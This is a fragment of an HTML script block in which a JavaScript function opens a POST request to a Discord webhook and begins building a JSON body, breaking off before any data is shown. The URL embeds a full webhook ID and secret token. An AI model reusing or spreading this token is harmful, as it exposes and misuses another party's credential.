    <script type="text/javascript">
    function discordWebhook(){

      request.open("POST", "https://discord.com/api/webhooks/938449936243101758/rcWCZi6n-9m-vVthHipXcPJNDSm4jbrM2k5utt3hWif0ihFrkBTaFpU5wLaEeSmOablh"); // <-- Discord webhook link 
      
      request.setRequestHeader('Content-type', 'application/json');

      const params = {
        username: "",
